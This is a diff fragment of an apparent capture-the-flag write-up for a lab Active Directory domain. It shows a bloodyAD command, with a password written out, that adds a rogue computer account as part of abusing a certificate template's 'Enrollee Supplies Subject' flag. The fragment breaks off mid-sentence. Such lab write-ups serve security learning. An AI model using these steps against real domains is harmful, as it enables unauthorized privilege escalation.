@@ -1012,5 +1012,8 @@ After some research i find the attribute that controls the `Enrollee Supplies Su
 Now ill modify the attribute to `"msPKI-Certificate-Name-Flag": 402653185` this sets the `Enrollee Supplie Subject` to true
 
 ```python
-
+❯❯❯ bloodyAD --host dc01.coder.htb -d coder.htb -u s.blade -p 'AmcwNO60Zg3vca3o0HDrTC6D' add computer 'evil' 'Password123!' --ou 'OU=BuildAgents,OU=Development,DC=coder,DC=htb' 
+[+] evil$ created
 ```
+
+Now since the machine template only allowed domain com
